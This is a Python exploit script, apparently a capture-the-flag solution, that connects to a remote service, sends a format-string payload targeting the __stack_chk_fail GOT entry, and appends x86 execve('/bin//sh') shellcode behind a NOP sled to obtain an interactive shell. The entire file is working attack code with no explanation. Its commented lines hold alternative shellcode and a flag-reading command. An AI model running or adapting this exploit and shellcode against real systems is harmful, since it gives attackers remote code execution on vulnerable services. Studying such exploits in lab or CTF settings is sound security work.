#!/usr/bin/env python
# -*- coding: utf-8 -*-
from zio import *

ip = '203.66.57.148'
ip = '10.211.55.48'
#ip = '10.10.10.140'
port = 9527

io = zio((ip, port), timeout = 1000, print_write = COLORED(REPR))
time.sleep(4)
io.read_until('(y/n)? ')
io.writeline('y')

stk_chk_fail_got = 0x804a018

#shellcode = "\xeb\x12\x31\xc9\x5e\x56\x5f\xb1\x15\x8a\x06\xfe"+\
#            "\xc8\x88\x06\x46\xe2\xf7\xff\xe7\xe8\xe9\xff\xff"+\
#            "\xff\x32\xc1\x32\xca\x52\x69\x30\x74\x69\x01\x69"+\
#            "\x30\x63\x6a\x6f\x8a\xe4\xb1\x0c\xce\x81"
#payload += shellcode + '\x90'*52

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73"+\
            "\x68\x68\x2f\x62\x69\x6e\x89"+\
            "\xe3\x89\xc1\x89\xc2\xb0\x0b"+\
            "\xcd\x80\x31\xc0\x40\xcd\x80"
#payload += shellcode + '\x90'*70

#shellcode = open("sc.bin","r").read()
#payload += shellcode + '\x90'*2

payload = 'Leo' + l32(stk_chk_fail_got+1)
payload = payload.ljust(140-9, 'A')
payload = payload.ljust(192-9)
payload += 'B'*48 + '%p ' * 10
payload += '%hhn'
payload = payload.ljust(422, '\x90')
payload += '\x90'*32 + shellcode + '\x90'*35

io.writeline(payload)
#io.write('cat /home/callme/flag\n')
#io.read()
io.interact()

